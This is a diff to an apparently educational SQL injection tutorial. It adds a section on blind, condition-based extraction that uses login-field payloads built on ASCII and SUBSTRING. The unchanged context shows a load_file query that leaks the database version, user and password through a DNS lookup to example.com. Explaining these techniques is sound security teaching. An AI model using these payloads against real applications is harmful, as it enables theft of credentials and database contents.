@@ -173,3 +173,15 @@ Let’s say the attacker is able to execute the following SQL query in the targe
 ```SELECT load_file(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT+user),'.', (SELECT+password),'.',example.com\\test.txt'))```
 
 This will cause the application to send a DNS request to the domain database_version.database_user.database_password.example.com, exposing sensitive data (database version, user name, and the user’s password) to the attacker.
+
+## Conditional Responses
+
+In the first case, the application logs you in as the admin user. In the second case, the login attempt fails, because the 1=2 condition is always false. You can leverage this control of the application’s behavior as a means of inferring the truth or falsehood of arbitrary conditions within the database itself. For example, using the ASCII and SUBSTRING functions described previously, you can test whether a specific character of a captured string has a specific value. For example, submitting this piece of input logs you in as the admin user, because the condition tested is true:
+
+```admin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 65--```
+
+Submitting the following input, however, results in a failed login, because the condition tested is false:
+
+```admin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 66--``` 
+
+By submitting a large number of such queries, cycling through the range of likely ASCII codes for each character until a hit occurs, you can extract the entire string, one byte at a time
